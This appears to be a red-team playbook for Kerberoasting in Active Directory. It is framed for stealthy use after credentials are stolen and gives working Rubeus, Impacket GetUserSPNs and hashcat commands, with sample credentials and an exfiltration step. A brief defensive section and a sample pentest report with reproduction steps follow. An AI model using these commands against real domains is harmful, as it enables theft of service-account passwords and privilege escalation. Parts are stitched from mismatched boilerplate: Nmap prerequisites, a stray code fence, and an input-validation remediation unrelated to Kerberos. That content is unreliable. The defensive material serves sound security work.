# Active Directory Kerberoasting

## When to Use
- Immediately after obtaining the credentials of *any* standard user in an Active Directory environment.
- To silently acquire the password hashes of highly privileged service accounts (e.g., SQL Server Admin, IIS Admin, Domain Admin running a service).
- When a Red Team operation requires strict stealth; Kerberoasting requires no elevated privileges and generates practically zero network anomalies to standard detection systems.


## Prerequisites
- Network access to the target subnet (VPN, pivot, or direct connection)
- Nmap and relevant network scanning tools installed
- Understanding of TCP/IP, common protocols, and network segmentation
- Root/admin access on the attack machine for raw socket operations

## Workflow

### Phase 1: Understanding the Mechanism

```text
# Concept: In Windows Kerberos, services (like SQL) are registered with a Service Principal Name (SPN).
# When a user wants to access a service, they request a Ticket Granting Service (TGS) ticket from the Domain Controller.

# The Vulnerability: The Domain Controller encrypts a portion of this TGS ticket using the 
# NTLM password hash of the *Service Account* running the service. 
# ANY authenticated user can request a TGS ticket for ANY registered service in the domain.
# Once requested, the attacker extracts the ticket containing the encrypted password hash from memory 
# and cracks it offline using Hashcat.
```

### Phase 2: Execution via Rubeus (Windows / C#)

```powershell
# Concept: Exploiting Kerberoasting perfectly from memory using Rubeus on a compromised Windows workstation.

# 1. Execute Rubeus to query LDAP for all accounts with SPNs, request TGS tickets for them, 
# and format the output directly for Hashcat.
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Rubeus outputs specifically formatted hashes resembling:
# $krb5tgs$23$*service_account$DOMAIN.LOCAL$spn_string*$<hexadecimal_hash>

# 2. Exfiltrate `hashes.txt` to the attacker's cracking rig.
```

### Phase 3: Execution via Impacket (Linux / Remote)

```bash
# Concept: Exploiting Kerberoasting from an unauthorized Kali Linux machine attached to the corporate network, 
# utilizing valid credentials phished from a user.

# 1. Provide the domain, username, and password to Impacket's GetUserSPNs.py.
# The script will output the TGS tickets to a file.
impacket-GetUserSPNs -request -dc-ip 192.168.1.100 CORP.LOCAL/jdoe:Password123! -outputfile hashes.txt

# Note: Sometimes it's useful to just list the SPNs first to target highly valuable accounts:
impacket-GetUserSPNs -dc-ip 192.168.1.100 CORP.LOCAL/jdoe:Password123!
```

### Phase 4: Offline Password Cracking (Hashcat)

```bash
# Concept: You cannot "Pass the Ticket" with a Service Ticket. You must crack the encryption 
# to acquire the plaintext password of the Service Account.

# 1. Transfer `hashes.txt` to a GPU-optimized cracking machine.
# 2. Execute hashcat targeting Kerberos 5 TGS-REP etype 23 (Hash Type 13100)
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O

# 3. Success: If the Service Account password was weak (e.g., "Summer2023!"), Hashcat cracks the 
# RC4 encryption, yielding the password.
# 4. Impact: The attacker now perfectly impersonates the Service Account, which often is a local Administrator or Domain Admin.
```

## 🔵 Blue Team Detection & Defense
- **Enforce Complex Passwords (Managed Service Accounts)**: The ONLY defense against an offline cryptographic crack is a massive, complex password. Migrate all Service Accounts to Group Managed Service Accounts (gMSA), which automatically generate and rotate 120-character random passwords that mathematically cannot be decrypted by Hashcat.
- **Implement AES Encryption (Etype 18)**: Older domains default to RC4 (Etype 23) encryption for TGS tickets, which cracks exponentially faster on GPUs. Ensure the domain functional level enforces AES-256 for Kerberos tickets, vastly slowing down brute-force cracking attempts.
- **Honey SPNs (Deception Tech)**: Create a fake Service Account (e.g., `SQL-Backup-Admin`) with an SPN but assign it a massive, impossible-to-crack password. Since no legitimate service uses this SPN, the *only* time a TGS is ever requested for it is during a Kerberoasting scan. Create an alert to trigger the moment this specific ticket is requested.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Kerberos | The default network authentication protocol used by Microsoft Active Directory, relying on tickets rather than transmitting raw passwords |
| SPN | Service Principal Name; a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account |
| TGS | Ticket Granting Service; a ticket provided by the Domain Controller permitting a user to interact with a specific service on the network |
| RC4 (Etype 23) | An outdated encryption algorithm heavily used in historical Active Directory deployments that is highly susceptible to rapid brute-force offline cracking via modern GPUs |

Penetration Test Report: Domain Privilege Escalation via Kerberoasting
======================================================================
Tactic: Credential Access (T1558.003)
Severity: Critical (CVSS 8.8)
Target: `CORP_SQL_SVC` Service Account

Description:
During internal network enumeration utilizing standard domain user credentials (`jdoe`), a Kerberoasting attack was executed against the Active Directory Domain Controller. 

The attacker queried LDAP for Active Directory accounts possessing a Service Principal Name (SPN) and systematically requested Ticket Granting Service (TGS) tickets for each identified service.

The resulting TGS ticket for the `CORP_SQL_SVC` account (encrypted utilizing RC4/Etype 23) was saved offline and subjected to a dictionary brute-force attack using Hashcat. The service account utilized a weak, predictable password (`CompanyDatabase1!`), which was successfully cracked in 14 minutes. 

Reproduction Steps:
1. Authenticate to the Domain Controller using Impacket.
2. Execute `impacket-GetUserSPNs CORP.LOCAL/jdoe:Password1 -request -outputfile hashes.txt`.
3. Transfer `hashes.txt` to cracking infrastructure.
4. Execute `hashcat -m 13100 hashes.txt rockyou.txt`.
5. Recover plaintext credentials: `CompanyDatabase1!`.
6. Authenticate to primary Database Server via WinRM utilizing the compromised credentials.

Impact:
The `CORP_SQL_SVC` account possessed Local Administrator rights across the entire Database Subnet, resulting in complete compromise of all financial database infrastructure by a low-level domain user.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.
